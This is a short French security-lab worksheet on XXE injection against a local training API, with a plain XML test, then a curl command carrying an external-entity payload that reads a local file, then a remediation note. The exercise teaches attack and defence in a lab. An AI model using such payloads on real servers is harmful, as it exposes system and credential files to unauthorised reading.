# TP3 — XXE avec WebGoat et Vuln API

## Test XML normal
```bash
curl -X POST http://vulnapi.target.local:5000/xml \
  -H "Content-Type: application/xml" \
  --data '<root><data>Hello XML</data></root>'
```

## Payload XXE local contrôlé
```bash
curl -X POST http://vulnapi.target.local:5000/xml \
  -H "Content-Type: application/xml" \
  --data '<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/lab-hostname.txt">
]>
<root><data>&xxe;</data></root>'
```

## Remédiation attendue
Désactiver DTD et entités externes, utiliser un parseur sécurisé.

## Livrable
```bash
cp ../livrables-templates/03-xxe.md livrables/03-xxe.md
```
